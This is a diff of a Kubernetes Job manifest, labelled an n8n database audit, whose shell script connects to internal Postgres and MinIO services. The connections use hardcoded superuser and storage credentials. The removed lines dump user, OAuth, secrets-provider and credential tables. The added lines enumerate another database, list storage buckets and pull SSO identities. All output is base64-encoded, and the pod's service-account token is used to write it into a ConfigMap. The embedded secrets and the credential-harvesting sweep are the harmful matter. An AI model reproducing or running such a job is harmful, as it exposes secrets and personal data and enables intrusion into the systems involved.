@@ -1,7 +1,7 @@
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: n8n-audit-result3
+  name: n8n-audit-result4
   namespace: default
 data:
   status: "pending"
@@ -9,7 +9,7 @@ data:
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: n8n-db-audit-v6
+  name: n8n-db-audit-v7
   namespace: default
 spec:
   ttlSecondsAfterFinished: 86400
@@ -26,30 +26,33 @@ spec:
         - |
           apk add -q postgresql-client curl jq 2>/dev/null
           PG="PGPASSWORD=wpEJl3WKOImARD9WgBsa psql -h 172.16.10.14 -p 6432 -U postgres"
-          USERS=$(eval "$PG -d n8n -c '\d \"user\"'" 2>&1)
-          USERDATA=$(eval "$PG -d n8n -c 'SELECT id, email, \"firstName\", \"lastName\", \"createdAt\", \"updatedAt\" FROM \"user\" ORDER BY \"createdAt\";'" 2>&1)
-          SECRETPROV=$(eval "$PG -d n8n -c '\d secrets_provider_connection'" 2>&1)
-          SECRETDATA=$(eval "$PG -d n8n -c 'SELECT * FROM secrets_provider_connection;'" 2>&1)
-          OAUTHCOLS=$(eval "$PG -d n8n -c '\d oauth_clients'" 2>&1)
-          OAUTHDATA=$(eval "$PG -d n8n -c 'SELECT * FROM oauth_clients;'" 2>&1)
-          DYNDATA=$(eval "$PG -d n8n -c 'SELECT * FROM dynamic_credential_entry;'" 2>&1)
-          DYNRESOLVER=$(eval "$PG -d n8n -c 'SELECT * FROM dynamic_credential_resolver;'" 2>&1)
-          INSTAI=$(eval "$PG -d n8n -c 'SELECT id, \"workflowId\", state FROM instance_ai_threads ORDER BY id LIMIT 20;'" 2>&1)
+          # Check rockefeller_db schema
+          ROCKSCHEMA=$(eval "$PG -d rockefeller_db -c '\dt'" 2>&1)
+          # Check key tables in rockefeller_db
+          ROCKTABLES=$(eval "$PG -d rockefeller_db -c 'SELECT tablename FROM pg_tables WHERE schemaname='"'"'public'"'"' ORDER BY tablename;'" 2>&1)
+          # Minio via mc client
+          apk add -q wget 2>/dev/null
+          wget -q https://dl.min.io/client/mc/release/linux-amd64/mc -O /usr/local/bin/mc 2>&1
+          chmod +x /usr/local/bin/mc
+          mc alias set minio http://argo-artifacts.argo-artifacts.svc.cluster.local:9000 miniokey sEkKOGp6QT8hnc1Y5R7W 2>&1
+          MINIOBUCKETS=$(mc ls minio/ 2>&1)
+          MINION8N=$(mc ls minio/n8n/ 2>&1 | head -20)
+          # Check auth_identity in n8n (SSO identities)
+          AUTHID=$(eval "$PG -d n8n -c 'SELECT \"userId\", provider, \"providerId\", \"providerType\" FROM auth_identity;'" 2>&1)
+          # Minio binary data check
+          MINIO_BD=$(mc ls minio/binary-data/ 2>&1 | head -20)
           TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
           API=https://kubernetes.default.svc
           CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-          RESULT=$(printf '{"usercols":"%s","userdata":"%s","secretprov":"%s","secretdata":"%s","oauthcols":"%s","oauthdata":"%s","dyndata":"%s","dynresolver":"%s","instai":"%s"}' \
-            "$(echo "$USERS" | base64 | tr -d '\n')" \
-            "$(echo "$USERDATA" | base64 | tr -d '\n')" \
-            "$(echo "$SECRETPROV" | base64 | tr -d '\n')" \
-            "$(echo "$SECRETDATA" | base64 | tr -d '\n')" \
-            "$(echo "$OAUTHCOLS" | base64 | tr -d '\n')" \
-            "$(echo "$OAUTHDATA" | base64 | tr -d '\n')" \
-            "$(echo "$DYNDATA" | base64 | tr -d '\n')" \
-            "$(echo "$DYNRESOLVER" | base64 | tr -d '\n')" \
-            "$(echo "$INSTAI" | base64 | tr -d '\n')")
+          RESULT=$(printf '{"rockschema":"%s","rocktables":"%s","miniobuckets":"%s","minion8n":"%s","authid":"%s","miniobd":"%s"}' \
+            "$(echo "$ROCKSCHEMA" | base64 | tr -d '\n')" \
+            "$(echo "$ROCKTABLES" | base64 | tr -d '\n')" \
+            "$(echo "$MINIOBUCKETS" | base64 | tr -d '\n')" \
+            "$(echo "$MINION8N" | base64 | tr -d '\n')" \
+            "$(echo "$AUTHID" | base64 | tr -d '\n')" \
+            "$(echo "$MINIO_BD" | base64 | tr -d '\n')")
           curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
             -X PATCH -H "Content-Type: application/merge-patch+json" \
-            "$API/api/v1/namespaces/default/configmaps/n8n-audit-result3" \
+            "$API/api/v1/namespaces/default/configmaps/n8n-audit-result4" \
             -d "{\"data\":{\"status\":\"done\",\"result\":$(echo $RESULT | jq -c -R '.')}}"
           echo "Done"
